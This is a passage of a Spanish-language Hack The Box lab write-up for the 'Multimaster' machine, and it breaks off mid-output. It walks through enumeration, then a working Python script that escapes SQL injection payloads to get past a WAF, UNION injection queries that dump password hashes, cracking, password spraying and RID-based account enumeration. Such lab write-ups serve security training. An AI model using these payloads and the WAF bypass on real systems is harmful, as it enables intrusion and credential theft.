-|   Target_Name: MEGACORP
-|   NetBIOS_Domain_Name: MEGACORP
-|   NetBIOS_Computer_Name: MULTIMASTER
-|   DNS_Domain_Name: MEGACORP.LOCAL
-|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
-|   DNS_Tree_Name: MEGACORP.LOCAL
-|   Product_Version: 10.0.14393
-|_  System_Time: 2023-03-31T15:43:32+00:00
-|_ssl-date: 2023-03-31T15:44:11+00:00; +6m58s from scanner time.
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49675/tcp open  msrpc         Microsoft Windows RPC
-49681/tcp open  msrpc         Microsoft Windows RPC
-49698/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-| smb-security-mode: 
-|   account_used: &amp;lt;blank&amp;gt;
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: required
-| smb-os-discovery: 
-|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
-|   Computer name: MULTIMASTER
-|   NetBIOS computer name: MULTIMASTER\x00
-|   Domain name: MEGACORP.LOCAL
-|   Forest name: MEGACORP.LOCAL
-|   FQDN: MULTIMASTER.MEGACORP.LOCAL
-|_  System time: 2023-03-31T08:43:32-07:00
-| smb2-time: 
-|   date: 2023-03-31T15:43:36
-|_  start_date: 2023-03-31T15:34:34
-|_clock-skew: mean: 1h30m58s, deviation: 3h07m50s, median: 6m58s
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 106.97 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;53&lt;/td&gt;
-      &lt;td&gt;DNS&lt;/td&gt;
-      &lt;td&gt;Simple DNS Plus&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Microsoft IIS httpd 10.0&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;88&lt;/td&gt;
-      &lt;td&gt;KERBEROS&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;135&lt;/td&gt;
-      &lt;td&gt;RPC&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;139&lt;/td&gt;
-      &lt;td&gt;LDAP&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;445&lt;/td&gt;
-      &lt;td&gt;SMB&lt;/td&gt;
-      &lt;td&gt;?&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;3389&lt;/td&gt;
-      &lt;td&gt;RDP&lt;/td&gt;
-      &lt;td&gt;Microsoft Terminal Services&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;5985&lt;/td&gt;
-      &lt;td&gt;WINRM&lt;/td&gt;
-      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usando la herramienta &lt;code&gt;crackmapexec&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179
-SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Añadimos el domain a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;10.10.10.179 MEGACORP.LOCAL&quot; &amp;gt;&amp;gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Buscaremos si podemos listar recursos compartidos, para ello podemos hacer uso de smbmap con los parametros &lt;code&gt;-H&lt;/code&gt; para especificar el host y &lt;code&gt;-u&lt;/code&gt; para hacer uso de una sesion nula.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.179 -u 'null'
-[!] Authentication error on 10.10.10.179
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que no contamos con acceso por smb , seguidamente probaremos a tratat de enumerar usuarios del sistema por rpc con &lt;code&gt;rpcclient&lt;/code&gt; y de igual manera no tenemos acceso.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rpcclient -U &quot;&quot; 10.10.10.179 -N
-rpcclient $&amp;gt; enumdomusers
-result was NT_STATUS_ACCESS_DENIED
-rpcclient $&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Entonces procederemos a abrir la pagina web correspondiente a un &lt;code&gt;IIS&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues de enumerar un rato la pagina web, en la opcion &lt;code&gt;colleague finder&lt;/code&gt; realizamos una busqueda que nos reporta una lista de usuarios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
-sbauer
-okent
-ckane
-kpage
-shayna
-james
-rmartin
-jorden
-alyx
-ilee
-nbourne
-zpowers
-aldom
-minato
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a validar si los usuarios son validos usando la herramienta &lt;code&gt;kerbrute&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/ropnop/kerbrute&quot;&gt;https://github.com/ropnop/kerbrute&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /opt/kerbrute/kerbrute userenum --dc 10.10.10.179 -d MEGACORP.LOCAL users.txt
-
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-
-Version: dev (n/a) - 03/31/23 - Ronnie Flathers @ropnop
-
-2023/03/31 18:45:44 &amp;gt;  Using KDC(s):
-2023/03/31 18:45:44 &amp;gt;  	10.10.10.179:88
-
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	ckane@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	okent@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	sbauer@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	rmartin@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	kpage@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	james@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	jorden@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	ilee@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	alyx@MEGACORP.LOCAL
-2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	zpowers@MEGACORP.LOCAL
-2023/03/31 18:45:45 &amp;gt;  [+] VALID USERNAME:	nbourne@MEGACORP.LOCAL
-2023/03/31 18:45:45 &amp;gt;  [+] VALID USERNAME:	aldom@MEGACORP.LOCAL
-2023/03/31 18:45:45 &amp;gt;  Done! Tested 14 usernames (12 valid) in 0.787 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como nos encontramos en un entorno de directorio activo y es un domain controler, vamos a intentar realizar con los usuarios un &lt;code&gt;ASREPRoast Attack&lt;/code&gt;, mediante el cual podemos solicituar un &lt;code&gt;TGT&lt;/code&gt; sin conocer las contraseñas de los usuarios para obtener hashes que podemos crackear de forma offline. Para ello usaremos la herramienta de &lt;code&gt;impakcet&lt;/code&gt; &lt;code&gt;GetNpUsers.py&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/ropnop/kerbrute&quot;&gt;https://github.com/fortra/impacket&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Anteriormente veiamos que en &lt;code&gt;Colleague Finder&lt;/code&gt; teniamos un input que vamos a proceder a interceptar con &lt;code&gt;burpsite&lt;/code&gt; para tratar de causar un error en la consulta.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Cuando añadimos simbolos como la &lt;code&gt;'&lt;/code&gt;, nos manda un mensaje de error &lt;code&gt;403&lt;/code&gt; Forbidden y con otros simbolos un &lt;code&gt;200&lt;/code&gt; ok, asi que vamos a intentar realizar fuerza bruta con &lt;code&gt;wfuzz&lt;/code&gt; para entender que esta pasando, para ello usaremos un diccionario del repositorio de &lt;code&gt;danielmiessler&lt;/code&gt; llamado &lt;code&gt;special-chars.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c -X POST -t 100 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{&quot;name&quot;:&quot;FUZZ&quot;}' -u http://10.10.10.179/api/getColleagues
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.179/api/getColleagues
-Total requests: 32
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                
-=====================================================================
-
-000000007:   403        29 L     92 W       1233 Ch     &quot;^&quot;                                                                                                                    
-000000015:   403        29 L     92 W       1233 Ch     &quot;=&quot;                                                                                                                    
-000000003:   403        29 L     92 W       1233 Ch     &quot;@&quot;                                                                                                                    
-000000001:   403        29 L     92 W       1233 Ch     &quot;~&quot;                                                                                                                    
-000000016:   403        29 L     92 W       1233 Ch     &quot;{&quot;                                                                                                                    
-000000014:   403        29 L     92 W       1233 Ch     &quot;+&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que al usar muchos hilos en la peticion el servidor nos bloquea por la existencia de un &lt;code&gt;WAF&lt;/code&gt;, para ello con usos adicionaremos unos parametros &lt;code&gt;-s 1&lt;/code&gt;, para que mande una peticion por segundo y ocultaremos el codigo de estado &lt;code&gt;200&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c -X POST --hc=200 -s 1 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{&quot;name&quot;:&quot;FUZZ&quot;}' -u http://10.10.10.179/api/getColleagues
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.179/api/getColleagues
-Total requests: 32
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                
-=====================================================================
-
-000000004:   403        29 L     92 W       1233 Ch     &quot;#&quot;                                                                                                                    
-000000021:   500        0 L      4 W        36 Ch       &quot;\&quot;                                                                                                                    
-000000028:   403        29 L     92 W       1233 Ch     &quot;:&quot;                                                                                                                    
-000000029:   403        29 L     92 W       1233 Ch     &quot;'&quot;                                                                                                                    
-000000030:   403        29 L     92 W       1233 Ch     &quot;&quot;&quot;                                                                                                                    
-000000031:   403        29 L     92 W       1233 Ch     &quot;&amp;lt;&quot;                                                                                                                    
-000000032:   403        29 L     92 W       1233 Ch     &quot;&amp;gt;&quot;                                                                                                                    
-
-Total time: 32.39251
-Processed Requests: 32
-Filtered Requests: 25
-Requests/sec.: 0.987882
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al finalizar wfuzz nos muestra que la &lt;code&gt;\&lt;/code&gt; nos reporta un codigo de estado &lt;code&gt;500 Internal Server Error&lt;/code&gt;, que curiosamente usa &lt;code&gt;sqlmap&lt;/code&gt; con el nombre de &lt;code&gt;tamper&lt;/code&gt; para ofuzcar sus payloads como en el siguente ejemplo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt; &amp;gt;&amp;gt;&amp;gt; tamper('SELECT FIELD FROM TABLE')
-    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A efectos practicos al mandar la peticion debemos usar &lt;code&gt;\\u00&lt;/code&gt; seguido de cada caracter en hexadecimal no es necesario usar tres  &lt;code&gt;\&lt;/code&gt; con uno basta.&lt;/p&gt;
-
-&lt;p&gt;Para no realizar la peticion una a una o usar sqlmap, vamos a realizarlo manualmente creandonos un script en &lt;code&gt;python3&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
-
-from pwn import *
-import requests, time, json, signal
-
-def def_handler(sig, frame):
-    print(&quot;\n[!] Saliendo...!\n&quot;)
-    sys.exit(1)
-
-#ctrl_c -&amp;gt; al presionar nos ejecuta la funcion def_handler
-signal.signal(signal.SIGINT, def_handler)
-
-#global_variables
-main_url = &quot;http://10.10.10.179/api/getColleagues&quot;
-
-
-#recibimos la data como input y la tratamos 
-def recivesql(sqlinyection):
-    sqlmodified = &quot;&quot;
-    for character in sqlinyection:
-        sqlmodified += &quot;\\u00&quot; + hex(ord(character))[2:]
-
-    return sqlmodified
-
-#realizamos la peticion enviando la data tratada y la representamos en formato json
-
-def sendsql(sqlmodified):
-
-    headers = {
-        'Content-Type': 'application/json;charset=utf-8'
-    }
-
-    data_post = '{&quot;name&quot;: &quot;%s&quot;}' % sqlmodified
-    
-    
-    r = requests.post(main_url, headers=headers, data=data_post)
-
-    data_json = json.loads(r.text)
-
-    return (json.dumps(data_json,indent=4))
-
-if __name__ == '__main__':
-
-#mediante un bucle recibimos la data como input
-
-    while True:
-        sqlinyection = input(&quot;&amp;gt; &quot;)
-        sqlinyection = sqlinyection.strip()
-        sqlmodified = recivesql(sqlinyection)
-        response_json = sendsql(sqlmodified)
-
-        print(response_json)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos el script y realizamos una inyeccion &lt;code&gt;sql&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 sql_inject.py
-&amp;gt; ttest' union select 1,schema_name,3,4,5 from information_schema.schemata-- -
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_accessadmin&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_backupoperator&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_datareader&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_datawriter&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_ddladmin&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_denydatareader&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_denydatawriter&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_owner&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;db_securityadmin&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;dbo&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;guest&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;INFORMATION_SCHEMA&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    },
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;sys&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Enumerando la base de datos &lt;code&gt;dbo&lt;/code&gt; encontramos usuarios y contraseñas encriptadas.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;aldom:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
-alyx:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
-ckane:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
-cyork:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
-egre55:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
-ilee:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
-james:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
-jorden:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
-kpage:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
-minatotw:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
-nbourne:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
-okent:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
-rmartin:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
-sbauer:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
-shayna:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
-zac:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
-zpowers:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Usaremos &lt;code&gt;hashcat&lt;/code&gt; para crackear los hashes, y logramos obtener 3 contraseñas.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;password1
-finance1
-banking1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ya que tenemos una lista de usuarios y contraeñas probamos a validar si alguna de ellas es valida con &lt;code&gt;crackmapexec&lt;/code&gt; y nos reprota que ninguna es valida.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
-SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:password1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:finance1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:banking1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Sim embargo debemos recordar que cuando nos encotramos en un entorno de directorio activo, podemos enumerar usuarios o informacion del &lt;code&gt;DC&lt;/code&gt; a partir de inyecciones.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; test' union select 1,default_domain(),3,4,5-- -
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora con una query especifica vamos a lista el SID y RID correspondiente al usuario &lt;code&gt;Administrator&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;SID Y RID: El Identificador Relativo (RID) es parte del Identificador de Seguridad (SID) en los dominios de Microsoft Windows. Es la parte del SID que identifica a un principal de seguridad (un usuario, grupo o equipo) en relación con la autoridad que expidió el SID.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; testt' union select 1,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),3,4,5-- -
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;De el resultado que nos reporta los ultimos 8 caracteres corresponden  al RDI, que viene a estar representado en hexadecimal si lo tratamos un poco.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3
-Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
-[GCC 10.2.1 20210110] on linux
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-&amp;gt;&amp;gt;&amp;gt; 0x01f4
-500
-&amp;gt;&amp;gt;&amp;gt; hex(500)
-'0x1f4'
-&amp;gt;&amp;gt;&amp;gt; hex(501)
-'0x1f5
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si modificamos el rdi con el valor hexadecimal de &lt;code&gt;501&lt;/code&gt;, entonces correspondera a otro usuario, en este caso &lt;code&gt;Ghest&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; test' union select 1,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f5010000)),3,4,5-- -
-[
